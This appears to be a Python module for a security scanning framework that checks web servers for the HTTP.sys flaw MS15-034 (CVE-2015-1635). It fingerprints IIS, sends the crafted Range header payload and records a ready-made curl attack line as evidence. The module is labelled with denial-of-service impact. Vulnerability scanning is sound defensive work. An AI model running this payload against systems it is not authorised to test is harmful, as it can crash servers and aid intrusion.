#!/bin/python

"""
[properties]
@author: Mario Robles
@version: 1.1
@name: MS15-034 - CVE-2015-1635 HTTP.sys Remote Code Execution Vulnerability
@id: ms15-034
@description: HTTP.sys in Microsoft Windows 7 SP1, Windows Server 2008 R2 SP1, Windows 8, Windows 8.1, and Windows Server 2012 Gold and R2 allows remote attackers to execute arbitrary code via crafted HTTP requests, aka "HTTP.sys Remote Code Execution Vulnerability."
@syntax: use ms15-034; host {hostname}; port {port_number}; exploit;
@type: exploit
@impact: dos
@service: web
@return_type: vuln
[properties]
type = [function,exploit,integration,tool]
impact = [safe,intrusive,dos]
service = [ssh,ftp,smtp,pop,imap,web,http,https,smb,tcp-##,udp-##]
return_type = [vuln,asset,boolean,null]
"""

import requests as requests

console = print

# Module Integration
mod_requirements = [
    {'name': 'host', 'description': 'Host name or IP address', 'type': 'string', 'required': True, 'value': None},
    {'name': 'port', 'description': 'TCP port, the default is 80', 'type': 'integer', 'required': False, 'value': 80}
    ]


def requirements():
    return mod_requirements


def run(reqs):
    global console
    target = None
    port = None
    try:
        if isinstance(reqs, list):
            for req in reqs:
                if "console" in req.keys():
                    console = req.get('console', print)
                if req.get('name') == 'host':
                    target = req['value']
                elif req.get('name') == 'port':
                    port = int(req['value'])
        if target is None:
            return {'description': 'Host is required', 'status': 'error'}
        if port is None:
            return {'description': 'Port is required', 'status': 'error'}
    except Exception as e:
        return {'description': f'Errors found in the data provided: {repr(e)}', 'status': 'error'}
    try:
        console("[ ! ] Starting process")
        results = ms15_034_scan(target, port)
        if isinstance(results, list):
            for vuln in results:
                vuln["issue_type"] = 'vulnerability'
                vuln["vulnerability_type"] = 'web'
                vuln["scan_type"] = 'dynamic scan'
                vuln["type"] = "HTTP.sys Remote Code Execution Vulnerability"
                vuln['severity'] = 'Critical'
                vuln['confidence'] = 'Confirmed'
                vuln['description'] = 'HTTP.sys in Microsoft Windows 7 SP1, Windows Server 2008 R2 SP1, Windows 8, ' \
                                      'Windows 8.1, and Windows Server 2012 Gold and R2 allows remote attackers to ' \
                                      'execute arbitrary code via crafted HTTP requests, aka "HTTP.sys Remote Code ' \
                                      'Execution Vulnerability."'
                vuln['tool'] = 'ms15-034.py'
                vuln['cve'] = 'CVE-2015-1635'
                vuln['cvss'] = '10'
                vuln['cvss string'] = 'AV:N/AC:L/Au:N/C:C/I:C/A:C'
                vuln['cwe'] = 'CWE-94'
                vuln['owasp'] = 'A6:2021'
                vuln['remediation'] = 'Upgrade or replace this server as soon as possible'
                vuln['references'] = [
                    {'title': 'CVE-2015-1635', 'url': 'https://nvd.nist.gov/vuln/detail/CVE-2015-1635'},
                    {'title': 'A06:2021', 'url': 'https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/'}
                ]

            return {'results': results, 'status': True}
        else:
            return {'description': "No Windows servers found", 'status': False}
    except Exception as e:
        msg = f"Error: {e}"
    return {'description': msg, 'status': 'error'}
# Module Integration


def is_windows(host, port=80):
    try:
        results = []
        if port in [80, 443]:
            urls = [f"https://{host}", f"http://{host}"]
        else:
            console("[ ! ] Performing protocol detection")
            urls = [f"http://{host}:{port}", f"https://{host}:{port}"]
        for url in urls:
            response = get(url)
            if response is not None:
                addit = False
                if 'x-powered-by' in response.headers and "ASP.NET" in response.headers['x-powered-by']:
                    console(f"[ ! ] Windows server found at: {url}")
                    console(f"      x-powered-by: {response.headers['x-powered-by']}")
                    addit = True
                elif 'server' in response.headers and "IIS" in response.headers['server']:
                    console(f"[ ! ] Windows server found at: {url}")
                    console(f"      server: {response.headers['server']}")
                    addit = True
                if addit:
                    results.append(url)
        if len(results) > 0:
            return results
        else:
            return []
    except Exception as e:
        console(f"[ X ] Error: {e}", "red")
        return []


def get(url, timeout=5):
    try:
        response = requests.get(url, verify=False, timeout=timeout)
        return response
    except Exception as e:
        if "timeout" in str(e).lower():
            msg = f"{url} = Connection timeout"
        elif "refused" in str(e).lower():
            msg = f"Connection refused: {url} "
        else:
            msg = f"{url} = {repr(e)}"
        console(f"[ ! ] {msg}", "red")
        return None


def ms15_034_scan(host, port):
    console("[ ! ] Beginning scan.")
    console(f"[ ! ] Validating platform on host: '{host}'")
    urls = is_windows(host, port)
    payload = 'bytes=0-18446744073709551615'
    if urls is not None:
        results = []
        vcount = 0
        for url in urls:
            console(f"[ ! ] Testing: {url}")
            attack = f"curl -H 'Range: {payload}' {url}"
            details = ''
            headers = {'Host': 'anything', 'Range': payload}
            response = requests.get(url, verify=False, headers=headers)
            if response.text.find("Requested Range Not Satisfiable") != -1:
                details = "Text: 'Requested Range Not Satisfiable' found in the response indicating the server is " \
                          "VULNERABLE"
                evidence = f"{details}\n\n{response.text}"
                msg = True
                vcount += 1
            elif response.text.find("The request has an invalid header name") != -1:
                details = "Text: 'The request has an invalid header name' found in the response indicating the " \
                           "server is patched"
                evidence = f"{details}\n\n{response.text}"
                msg = False
            else:
                msg = "error"
                evidence = f"Unexpected response, cannot discern patch status\n\n{response.text}"

            protocol = "http"
            if url.startswith("https://"):
                protocol = "https"
            if msg is True and msg != "error":
                results.append({
                    "details": details,
                    "evidence": evidence,
                    "port": port,
                    "protocol": protocol,
                    "transport": 'tcp',
                    "url": url,
                    "attack": attack,
                    "request": str(response.request.headers),
                    "response": str(response.text)
                })

        if vcount == 0:
            console("[ ! ] No vulnerabilities found")
        else:
            console(f"[ ! ] {vcount} vulnerable URL(s)")
        return results
    else:
        msg = False
        evidence = "No Windows Server detected"
    console("[ ! ] Scan completed without results")
    return {"status": msg, "description": evidence}
